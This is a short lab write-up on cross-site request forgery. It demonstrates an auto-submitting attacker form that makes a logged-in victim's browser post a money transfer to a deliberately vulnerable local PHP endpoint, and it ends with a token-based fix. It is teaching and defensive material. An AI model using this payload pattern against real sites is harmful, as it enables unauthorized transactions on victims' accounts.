# Lab 4 — CSRF (Cross-Site Request Forgery)

**Goal:** Transfer money without the victim's interaction beyond visiting a page.

## Files

- Form: `/lab4-csrf/transfer.php`
- Action (no token): `/lab4-csrf/transfer_action.php`

## Attack Page

```html
<!-- Attacker page (save as attacker.html and open while logged in) -->
<form action="http://localhost/A012025-Broken-Access-Control/lab4-csrf/transfer_action.php"
      method="POST">
  <input name="to" value="2">
  <input name="amount" value="100">
</form>
<script>document.forms[0].submit();</script>
```

## Attack Steps

1. Login as the victim user
2. Open the attacker page (or host it on another domain)
3. The form automatically submits
4. Money is transferred without the victim's consent

## Fix

Generate and validate a CSRF token:

```php
// Generate token
$_SESSION['csrf'] = bin2hex(random_bytes(32));

// Validate token
if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
    http_response_code(403);
    exit;
}
```

Include the token in the form and validate it on submission.
